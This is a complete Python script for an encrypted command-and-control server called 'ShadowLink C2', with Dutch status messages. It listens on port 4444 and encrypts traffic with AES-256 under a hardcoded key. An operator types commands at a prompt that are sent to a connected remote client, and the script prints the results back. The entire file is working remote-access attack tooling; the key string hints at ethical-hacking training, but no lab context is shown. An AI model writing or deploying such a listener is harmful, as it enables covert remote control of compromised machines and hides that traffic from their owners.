#!/usr/bin/env python3
import hashlib, socket, struct, sys
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 4444
KEY = hashlib.sha256(b"ShadowLink-EH-2026").digest()

def encrypt(plaintext):
    iv = get_random_bytes(AES.block_size)
    return iv + AES.new(KEY, AES.MODE_CBC, iv).encrypt(pad(plaintext, AES.block_size))

def decrypt(blob):
    iv, ct = blob[:AES.block_size], blob[AES.block_size:]
    return unpad(AES.new(KEY, AES.MODE_CBC, iv).decrypt(ct), AES.block_size)

def send_msg(conn, plaintext):
    blob = encrypt(plaintext)
    conn.sendall(struct.pack("!I", len(blob)) + blob)

def recv_msg(conn):
    header = b""
    while len(header) < 4:
        chunk = conn.recv(4 - len(header))
        if not chunk:
            return None
        header += chunk
    length = struct.unpack("!I", header)[0]
    blob = b""
    while len(blob) < length:
        chunk = conn.recv(min(4096, length - len(blob)))
        if not chunk:
            return None
        blob += chunk
    return decrypt(blob)

def session(conn, addr):
    print(f"[+] Versleutelde sessie van {addr[0]}:{addr[1]}")
    while True:
        try:
            cmd = input("shadowlink> ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n[*] Sessie beeindigd.")
            return
        if not cmd:
            continue
        if cmd.lower() in ("exit", "quit"):
            try:
                send_msg(conn, cmd.encode())
            except Exception:
                pass
            return
        try:
            send_msg(conn, cmd.encode())
        except (BrokenPipeError, ConnectionResetError, OSError) as e:
            print(f"[-] Zenden mislukt: {e} - client verbroken.")
            return
        try:
            response = recv_msg(conn)
        except (ConnectionResetError, OSError) as e:
            print(f"[-] Ontvangen mislukt: {e} - client verbroken.")
            return
        if response is None:
            print("[-] Verbinding verbroken door client.")
            return
        print(response.decode("utf-8", errors="replace"), end="")
        if not response.endswith(b"\n"):
            print()

def main():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((SERVER_HOST, SERVER_PORT))
    srv.listen(1)
    print(f"[*] ShadowLink C2 (AES-256) luistert op {SERVER_HOST}:{SERVER_PORT} ...")
    while True:
        try:
            conn, addr = srv.accept()
            try:
                session(conn, addr)
            except Exception as e:
                print(f"[-] Sessie fout: {e}")
            finally:
                try:
                    conn.close()
                except Exception:
                    pass
            print("[*] Wacht op nieuwe verbinding ...")
        except KeyboardInterrupt:
            print("\n[*] Server gestopt.")
            srv.close()
            sys.exit(0)

if __name__ == "__main__":
    main()
